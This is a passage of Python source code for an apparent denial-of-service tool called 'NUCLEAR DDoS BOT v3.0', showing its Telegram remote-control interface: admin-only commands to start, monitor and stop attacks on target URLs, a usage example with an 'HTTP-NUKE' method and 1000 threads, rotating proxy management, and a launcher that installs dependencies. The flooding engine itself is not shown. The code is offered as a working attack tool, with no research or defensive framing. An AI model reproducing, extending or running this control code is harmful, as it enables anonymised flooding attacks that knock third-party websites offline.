            await update.message.reply_text("❌ Unauthorized!")
            return
        
        stats = self.attack_manager.get_all_stats()
        
        if not stats["active_attacks"]:
            await update.message.reply_text("📊 *No active attacks*", parse_mode='Markdown')
            return
        
        status_text = "📊 *ACTIVE ATTACKS*\n\n"
        
        for attack in stats["active_attacks"]:
            mb_sent = attack["bytes"] / (1024 * 1024)
            mbps = attack["bps"] / (1024 * 1024) if attack["bps"] > 0 else 0
            
            status_text += f"""🎯 *Attack ID:* `{attack['id']}`
• Target: `{attack['target']}`
• Method: `{attack['method']}`
• Active: `{attack['active']}`
• Duration: `{attack['duration']:.1f}s`
• Requests: `{attack['requests']:,}`
• RPS: `{attack['rps']:.1f}`
• Data Sent: `{mb_sent:.2f} MB`
• Speed: `{mbps:.2f} MB/s`
• Threads: `{attack['threads']}`

"""
        
        status_text += f"\n*Global Stats:*\n"
        status_text += f"• Total Requests: `{stats['global_stats']['total_requests']:,}`\n"
        status_text += f"• Total Data: `{stats['global_stats']['total_bytes'] / (1024*1024*1024):.2f} GB`\n"
        status_text += f"• Active Attacks: `{stats['global_stats']['active_attacks']}`\n"
        status_text += f"• Total Attacks: `{stats['global_stats']['total_attacks']}`\n"
        status_text += f"• Proxies: `{stats['proxy_count']}`"
        
        await update.message.reply_text(status_text, parse_mode='Markdown')
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stop command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        if context.args:
            # Stop specific attack
            attack_id = context.args[0]
            success = self.attack_manager.stop_attack(attack_id)
            
            if success:
                await update.message.reply_text(
                    f"✅ Stopped attack `{attack_id}`",
                    parse_mode='Markdown'
                )
            else:
                await update.message.reply_text(
                    f"❌ No active attack with ID `{attack_id}`",
                    parse_mode='Markdown'
                )
        else:
            # Stop all attacks
            self.attack_manager.stop_all_attacks()
            await update.message.reply_text("✅ All attacks stopped!")
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        stats = self.attack_manager.get_all_stats()
        
        stats_text = f"""📈 *BOT STATISTICS*

*Global Performance:*
• Total Requests: `{stats['global_stats']['total_requests']:,}`
• Total Data: `{stats['global_stats']['total_bytes'] / (1024*1024*1024):.2f} GB`
• Active Attacks: `{stats['global_stats']['active_attacks']}`
• Total Attacks: `{stats['global_stats']['total_attacks']}`

*System Status:*
• Proxies Available: `{stats['proxy_count']}`
• Max Threads: `{CONFIG['MAX_TOTAL_THREADS']}`
• Max Attack Time: `{CONFIG['MAX_ATTACK_TIME']}s`
• Methods Available: `{len(ATTACK_METHODS)}`

*Bot Status:* `🟢 OPERATIONAL`
*Last Update:* `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`"""
        
        await update.message.reply_text(stats_text, parse_mode='Markdown')
    
    async def proxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /proxies command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        proxy_count = len(self.attack_manager.proxy_manager.proxies)
        last_refresh = datetime.fromtimestamp(
            self.attack_manager.proxy_manager.last_refresh
        ).strftime('%Y-%m-%d %H:%M:%S')
        
        proxies_text = f"""🌐 *PROXY INFORMATION*

• Active Proxies: `{proxy_count}`
• Last Refresh: `{last_refresh}`
• Sources: `{len(PROXY_SOURCES)}`
• Refresh Interval: `{CONFIG['PROXY_REFRESH_INTERVAL']}s`

*Proxy Sources:*
"""
        
        for i, source in enumerate(PROXY_SOURCES[:5], 1):
            proxies_text += f"{i}. `{source}`\n"
        
        if len(PROXY_SOURCES) > 5:
            proxies_text += f"... and {len(PROXY_SOURCES) - 5} more\n"
        
        proxies_text += "\n*Command:* `/refresh_proxies` to refresh now"
        
        await update.message.reply_text(proxies_text, parse_mode='Markdown')
    
    async def refresh_proxies_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /refresh_proxies command"""
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await update.message.reply_text("❌ Unauthorized!")
            return
        
        await update.message.reply_text("🔄 Refreshing proxies...")
        
        self.attack_manager.proxy_manager.load_proxies()
        
        proxy_count = len(self.attack_manager.proxy_manager.proxies)
        await update.message.reply_text(
            f"✅ Proxies refreshed! Now have `{proxy_count}` proxies.",
            parse_mode='Markdown'
        )
    
    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle inline keyboard button presses"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        if user_id not in CONFIG["ADMIN_IDS"]:
            await query.edit_message_text("❌ Unauthorized!")
            return
        
        if query.data == "menu_start":
            await query.edit_message_text(
                "⚡ *Start Attack*\n\n"
                "Use: `/attack [url] [method] [time] [threads]`\n\n"
                "*Example:* `/attack example.com HTTP-NUKE 60 1000`\n\n"
                "Use `/methods` to see available methods.",
                parse_mode='Markdown'
            )
        
        elif query.data == "menu_methods":
            await self.methods_command(update, context)
        
        elif query.data == "menu_status":
            await self.status_command(update, context)
        
        elif query.data == "menu_stop":
            keyboard = [
                [InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data="confirm_stop_all")],
                [InlineKeyboardButton("🔙 BACK", callback_data="menu_main")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "🛑 *Stop Attacks*\n\n"
                "Are you sure you want to stop all attacks?",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
        
        elif query.data == "confirm_stop_all":
            self.attack_manager.stop_all_attacks()
            await query.edit_message_text("✅ All attacks stopped!")
        
        elif query.data == "menu_stats":
            await self.stats_command(update, context)
        
        elif query.data == "menu_refresh":
            await self.refresh_proxies_command(update, context)
        
        elif query.data == "menu_main":
            await self.start(update, context)
    
    async def unknown_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle unknown commands"""
        await update.message.reply_text(
            "❌ Unknown command!\n"
            "Use /start to see available commands."
        )
    
    def run(self):
        """Run the Telegram bot"""
        # Create application
        self.application = Application.builder().token(CONFIG["TELEGRAM_BOT_TOKEN"]).build()
        
        # Add command handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("attack", self.attack_command))
        self.application.add_handler(CommandHandler("methods", self.methods_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("stop", self.stop_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("proxies", self.proxies_command))
        self.application.add_handler(CommandHandler("refresh_proxies", self.refresh_proxies_command))
        
        # Add callback query handler
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        
        # Add unknown command handler
        self.application.add_handler(MessageHandler(filters.COMMAND, self.unknown_command))
        
        # Start bot
        Logger.success("Telegram bot starting...")
        self.application.run_polling(allowed_updates=Update.ALL_TYPES)

# ========== MAIN ==========
def main():
    """Main function"""
    # Banner
    print(Fore.CYAN + """
    ╔══════════════════════════════════════════════════════════╗
    ║         ☢️ NUCLEAR DDoS BOT v3.0 - ULTIMATE ☢️         ║
    ║               7-LAYER ATTACK SYSTEM                     ║
    ║                  AUTO-TIME CONTROL                      ║
    ║                HIGH-THREAD OPTIMIZED                    ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    Logger.success("Initializing Nuclear DDoS Bot v3.0...")
    
    # Check imports
    try:
        import requests
        import cloudscraper
    except ImportError as e:
        Logger.error(f"Missing dependency: {e}")
        Logger.info("Installing dependencies...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", 
                              "requests", "cloudscraper", "python-telegram-bot", 
                              "colorama"])
        Logger.success("Dependencies installed. Please restart the bot.")
        sys.exit(1)
    
    # Initialize attack manager
    attack_manager = AttackManager()
    
    # Initialize Telegram bot
    telegram_bot = TelegramBot(attack_manager)
    
    # Run bot in separate thread
    bot_thread = threading.Thread(target=telegram_bot.run, daemon=True)
    bot_thread.start()
    
    Logger.success("Bot is running! Use /start in Telegram to begin.")
    Logger.info("Press Ctrl+C to stop.")
    
    try:
        # Keep main thread alive
        while True:
            # Refresh proxies if needed
            attack_manager.proxy_manager.refresh_if_needed()
            
            # Update stats periodically
            time.sleep(CONFIG["STATS_UPDATE_INTERVAL"])
            
    except KeyboardInterrupt:
        Logger.warning("Shutting down...")
        attack_manager.stop_all_attacks()
        Logger.success("Bot stopped successfully.")
        sys.exit(0)

if __name__ == "__main__":
    main()
